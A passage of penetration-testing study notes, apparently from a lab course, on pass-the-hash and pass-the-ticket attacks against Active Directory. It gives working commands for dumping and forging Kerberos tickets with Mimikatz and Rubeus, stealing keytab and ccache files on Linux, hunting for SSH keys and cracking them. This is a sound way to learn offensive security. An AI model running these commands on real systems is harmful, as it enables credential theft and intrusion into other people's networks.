- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


### <mark class="hltr-orange">PTH with nxc (Linux)</mark>

```shell-session
nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

We can also use the option `-x` to execute commands.

```shell-session
nxc smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### <mark class="hltr-orange">PTH with evil-winrm (Linux)</mark>

[evil-winrm](https://github.com/Hackplayers/evil-winrm) is another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

```shell-session
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### <mark class="hltr-orange">PTH with RDP (Linux)</mark>

We can perform an RDP PtH attack to gain GUI access to the target system using tools like `xfreerdp`.

`Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:

![[Pasted image 20240911183738.png]]

This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```cmd-session
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


Now we can perform a pass the hash attack using RDP

```shell-session
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```


## <mark class="hltr-cyan">Pass the Ticket (PtT) from Windows</mark>

Another method for moving laterally in an Active Directory environment is called a [Pass the Ticket (PtT) attack](https://attack.mitre.org/techniques/T1550/003/). In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash.

### <mark class="hltr-orange">Kerberos Protocol Refresher</mark>

The Kerberos authentication system is ticket-based. The central idea behind Kerberos is not to give an account password to every service you use. Instead, Kerberos keeps all tickets on your local system and presents each service only the specific ticket for that service, preventing a ticket from being used for another purpose.

- The `TGT - Ticket Granting Ticket` is the first ticket obtained on a Kerberos system. The TGT permits the client to obtain additional Kerberos tickets or `TGS`.
- The `TGS - Ticket Granting Service` is requested by users who want to use a service. These tickets allow services to verify the user's identity.

When a user requests a `TGT`, they must authenticate to the domain controller by encrypting the current timestamp with their password hash. Once the domain controller validates the user's identity (because the domain knows the user's password hash, meaning it can decrypt the timestamp), it sends the user a TGT for future requests. Once the user has their ticket, they do not have to prove who they are with their password.

If the user wants to connect to an MSSQL database, it will request a Ticket Granting Service (TGS) to The Key Distribution Center (KDC), presenting its Ticket Granting Ticket (TGT). Then it will give the TGS to the MSSQL database server for authentication.

We need a valid Kerberos ticket to perform a `Pass the Ticket (PtT)`. It can be: TGT or TGS

### <mark class="hltr-orange">Harvesting Kerberos Tickets from Windows</mark>

On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. ❗: As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.

#### <mark class="hltr-grey">Mimikatz Export Tickets</mark>

We can harvest all tickets from a system using the <mark class="hltr-green">Mimikatz</mark> module <mark class="hltr-green">sekurlsa::tickets /export</mark>. The result is a list of files with the extension <mark class="hltr-green">.kirbi</mark>, which contain the tickets.

```
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # exit

C:\tools> dir *.kirbi
```

The tickets that end with `$` correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`.

![[Pasted image 20240912102450.png]]

#### <mark class="hltr-grey">Rubeus - Export Tickets</mark>

We can also export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (if running as a local administrator). `Rubeus dump`, instead of giving us a file, will print the ticket <mark class="hltr-green">encoded in base64 format</mark>. We are adding the option `/nowrap` for easier copy-paste.

```cmd-session
c:\tools> Rubeus.exe dump /nowrap
```

### <mark class="hltr-orange">Pass The Key or OverPass The Hash</mark>

Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the `OverPass the Hash or Pass the Key` technique.

The traditional `Pass the Hash (PtH)` technique involves reusing an NTLM password hash that doesn't touch Kerberos. The `Pass the Key` or `OverPass the Hash` approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full `Ticket-Granting-Ticket (TGT)`.

#### <mark class="hltr-grey">Mimikatz - Extract Kerberos Keys</mark>

```
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Now that we have access to the `AES256_HMAC` and `RC4_HMAC` keys, we can perform the OverPass the Hash or Pass the Key attack using `Mimikatz` and `Rubeus`.

#### <mark class="hltr-grey">Mimikatz - Pass the Key or OverPass the Hash</mark>

```
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

#### <mark class="hltr-grey">Rubeus - Pass the Key or OverPass the Hash</mark>

To forge a ticket using `Rubeus`, we can use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. In the following example, we use the aes256 hash from the information we collect using Mimikatz `sekurlsa::ekeys`.

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```


**Note❗:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

### <mark class="hltr-orange">Pass The Ticket (PtT)</mark>

Now that we have some Kerberos tickets, we can use them to move laterally within an environment.

#### <mark class="hltr-grey">Rubeus Pass the Ticket (method 1)</mark>

```cmd-session
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```

![[Pasted image 20240912112353.png]]

#### <mark class="hltr-grey">Rubeus Pass the Ticket (method 2)</mark>

Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

Let's use a ticket exported from Mimikatz and import it using Pass the Ticket.

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```


```cmd-session
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

#### <mark class="hltr-grey">Rubeus Pass the Ticket (method 3: Base64)</mark>

Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.

```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>
```

##### <mark class="hltr-purple">Converting .kirbi to base64</mark>

```powershell-session
PS c:\tools> [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```


#### <mark class="hltr-grey">Mimikatz - Pass the Ticket</mark>

```cmd-session
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

```
c:\tools> dir \\DC01.inlanefreight.htb\c$
Directory: \\dc01.inlanefreight.htb\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         6/4/2022  11:17 AM                Program Files
d-----         6/4/2022  11:17 AM                Program Files (x86)

<SNIP>
```

### <mark class="hltr-orange">Pass The Ticket with PowerShell Remoting (Windows)</mark>

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to run scripts or commands on a remote computer. Administrators often use PowerShell Remoting to manage remote computers on the network. Enabling PowerShell Remoting creates both HTTP and HTTPS listeners. The listener runs on standard port TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.

Suppose we find a user account that doesn't have administrative privileges on a remote computer but is a member of the Remote Management Users group. In that case, we can use PowerShell Remoting to connect to that computer and execute commands.

#### <mark class="hltr-grey">Mimikatz - PowerShell Remoting with Pass the Ticket</mark>

To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Let's open a new `cmd.exe` and execute mimikatz.exe, then import the ticket we collected using <mark class="hltr-green">kerberos::ptt</mark>. Once the ticket is imported into our cmd.exe session, we can launch a PowerShell command prompt from the same cmd.exe and use the command <mark class="hltr-green">Enter-PSSession</mark> to connect to the target machine.

```cmd-session
C:\tools> mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
[DC01]: PS C:\Users\john\Documents>
```


#### <mark class="hltr-grey">Rubeus - PowerShell Remoting with Pass the Ticket</mark>

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). The process is hidden by default, but we can specify the flag `/show` to display the process, and the result is the equivalent of `runas /netonly`. This prevents the erasure of existing TGTs for the current logon session.

```cmd-session
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option `/ptt` to import the ticket into our current session and connect to the DC using PowerShell Remoting.

```cmd-session
C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```

## <mark class="hltr-cyan">Pass the Ticket (PtT) from Linux</mark>

Although not common, Linux computers can connect to Active Directory to provide centralized identity management and integrate with the organization's systems, giving users the ability to have a single identity to authenticate on Linux and Windows computers.

A Linux computer connected to Active Directory <mark class="hltr-green">commonly uses Kerberos as authentication</mark>. Suppose this is the case, and we manage to compromise a Linux machine connected to Active Directory. In that case, we could try to find Kerberos tickets to impersonate other users and gain more access to the network.

A Linux system can be configured in <mark class="hltr-green">various ways to store Kerberos tickets</mark>. We'll discuss a few different storage options in this section.

### <mark class="hltr-orange">Kerberos on Linux</mark>

#### <mark class="hltr-grey">ccache files</mark>

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) (<mark class="hltr-green">credential cache</mark>) in the <mark class="hltr-green">/tmp</mark> directory.

By default, the location of the Kerberos ticket is stored in the environment variable <mark class="hltr-green">KRB5CCNAME</mark>.

These [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) are <mark class="hltr-green">protected by reading and write permissions</mark>, but a user with elevated privileges or root privileges could easily gain access to these tickets.


#### <mark class="hltr-grey">keytab files</mark>

Another everyday use of Kerberos in Linux is with [keytab](https://kb.iu.edu/d/aumh) files. A [keytab](https://kb.iu.edu/d/aumh) is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

❗: [Keytab](https://kb.iu.edu/d/aumh) files commonly allow scripts to authenticate automatically using Kerberos without requiring human interaction.

### <mark class="hltr-orange">Linux Auth via Port Forward</mark>

We have a computer (`LINUX01`) connected to the Domain Controller. This machine is only reachable through `MS01`.

To access this machine over SSH, we can use a port forward, to simplify the interaction with `LINUX01`. By connecting to port TCP/2222 on `MS01`, we will gain access to port TCP/22 on `LINUX01`.

```shell-session
dalichabani7academy@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

### <mark class="hltr-orange">Identifying Linux and AD Integration</mark>

#### <mark class="hltr-grey">realm</mark>

We can identify if the Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd), a tool used to manage system enrollment in a domain and set which domain users or groups are allowed to access the local system resources.

```
realm list
```

![[Pasted image 20240920131407.png]]

It also gives us information about the domain name (inlanefreight.htb) and which users and groups are permitted to log in, which in this case are the users David and Julio and the group Linux Admins.


#### <mark class="hltr-grey">PS</mark>

In case [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd) is not available, we can also look for other tools used to integrate Linux with Active Directory such as [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html). Looking for those services running in the machine is another way to identify if it is domain joined. Let's search for those services to confirm if the machine is domain joined.

```shell-session
ps -ef | grep -i "winbind\|sssd"
```

![[Pasted image 20240920131719.png]]

#### <mark class="hltr-grey">id / groups</mark>

![[Pasted image 20240920132125.png]]

### <mark class="hltr-orange">Finding Kerberos Tickets in Linux</mark>

#### <mark class="hltr-grey">Finding Keytab files</mark>

##### <mark class="hltr-purple">Find</mark>

```
find / -name *keytab* 2>/dev/null
```
or
```
find / -name *.kt 2>/dev/null
```

##### <mark class="hltr-purple">Identifying Keytab Files in Cronjobs
</mark>

```shell-session
crontab -l
```

![[Pasted image 20240920134104.png]]

In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) <mark class="hltr-green">allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file).</mark> We can use `kinit` to import a `keytab` into our session and act as the user.

In this example, we found a script importing a Kerberos ticket (`svc_workstations.kt`) for the user `svc_workstations@INLANEFREIGHT.HTB` before trying to connect to a shared folder. We can use those tickets to impersonate users.

#### <mark class="hltr-grey">Finding ccache Files</mark>

```shell-session
env | grep -i krb5
```

As mentioned previously, `ccache` files are located, by default, at `/tmp`. We can search for users who are logged on to the computer, and if we gain access as root or a privileged user, we would be able to impersonate a user using their `ccache` file while it is still valid.

```
ls -alh /tmp
```

### <mark class="hltr-orange">Abusing Keytab files</mark>

#### <mark class="hltr-grey">Impersonating a user with a keytab</mark>

At first we can list the keytab files information using <mark class="hltr-green">klist</mark> (This application reads information from a `keytab` file.)


We can look for keytab files and query informations
```shell-session
klist -k -t 
```


Or directly specifying the keytab file
```shell-session
klist -k -t /opt/specialfiles/carlos.keytab
```

![[Pasted image 20240920141218.png]]

The ticket corresponds to the user Carlos. We can now impersonate the user with <mark class="hltr-green">kinit</mark>.

❗: **kinit** is case-sensitive, so be sure to use the name of the principal as shown in klist. In this case, the username is lowercase, and the domain name is uppercase.

```shell-session
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

![[Pasted image 20240920142244.png]]

We can attempt to access the shared folder `\\dc01\carlos` to confirm our access.

```shell-session
smbclient //dc01/carlos -k -c ls
```

#### <mark class="hltr-grey">Keytab Extract</mark>

keytab files hold ntlm hashes that we can try to crack in order to gain access to his account on the Linux machine.

(The previous method does not grant access to the local account, but rather to services)

We can attempt to crack the account's password by extracting the hashes from the keytab file. Let's use [KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files.

```shell-session
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```

![[Pasted image 20240920151010.png]]

With the NTLM hash, we can perform a Pass the Hash attack. With the AES256 or AES128 hash, we can forge our tickets using Rubeus or attempt to crack the hashes to obtain the plaintext password.


**Cracking the password using hashcat**:
```
hashcat -m 1000 a738f92b3c08b424ec2d99589a9cce60 /usr/share/wordlists/rockyou.txt
```

**log in as carlos**:
```shell-session
su - carlos@inlanefreight.htb
```


### <mark class="hltr-orange">Abusing Keytab ccache</mark>

To abuse a ccache file, all we need is <mark class="hltr-green">read privileges</mark> on the file. These files, located in `/tmp`, can only be read by the user who created them, <mark class="hltr-green">but if we gain root access, we could use them.</mark>

at first we have to look for ccache files:
```
ls -alh /tmp
```
or
```
ls -alh /tmp/krb5*
```

#### <mark class="hltr-grey">Identifying Group Membership with the id Command</mark>

There is one user (julio@inlanefreight.htb) to whom we have not yet gained access.

```shell-session
id julio@inlanefreight.htb
```

Julio is a member of the `Domain Admins` group. We can attempt to impersonate the user and gain access to the `DC01` Domain Controller host.

#### <mark class="hltr-grey">Importing the ccache File into our Current Session</mark>

we have to change the value of the <mark class="hltr-green">KRB5CCNAME</mark>
environment variable and set it to julio's ccache file path:

```shell-session
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```

then verify if it worked using klist:
![[Pasted image 20240920172605.png]]

❗: klist displays the ticket information. We must consider the values "valid starting" and "expires." <mark class="hltr-red">If the expiration date has passed, the ticket will not work</mark>.

We can now access the DC as an admin (since julio is among the Domain Admin group members):
```shell-session
smbclient //dc01/C$ -k -no-pass
```


### <mark class="hltr-orange">Linikatz</mark>

[Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.


Just like `Mimikatz`, to take advantage of Linikatz, we need to be root on the machine. This tool will extract all credentials, including Kerberos tickets, from different Kerberos implementations such as FreeIPA, SSSD, Samba, Vintella, etc. Once it extracts the credentials, it places them in a folder whose name starts with `linikatz.`


```shell-session
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

/opt/linikatz.sh
```

Using Linikatz we have found the path to the linux01 ccache file:
```shell-session
Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
```

we can now export it:
```
export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
```

and connect to the linux01 share:
```
smbclient //dc01/linux01 -no-pass -k
```

---

# <mark class="hltr-pink">Cracking Files</mark>

## <mark class="hltr-cyan">Protected Files</mark>

### <mark class="hltr-orange">Hunting for Files</mark>

```shell-session
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

### <mark class="hltr-orange">Hunting for SSH Keys</mark>

```shell-session
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

Most SSH keys we will find nowadays are encrypted. We can recognize this by the header of the SSH key because this shows the encryption method in use.

![[Pasted image 20240921161415.png]]

### <mark class="hltr-orange">Cracking with john</mark>

```
locate *2john*
```

example:
```
ssh2john ssh.private > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

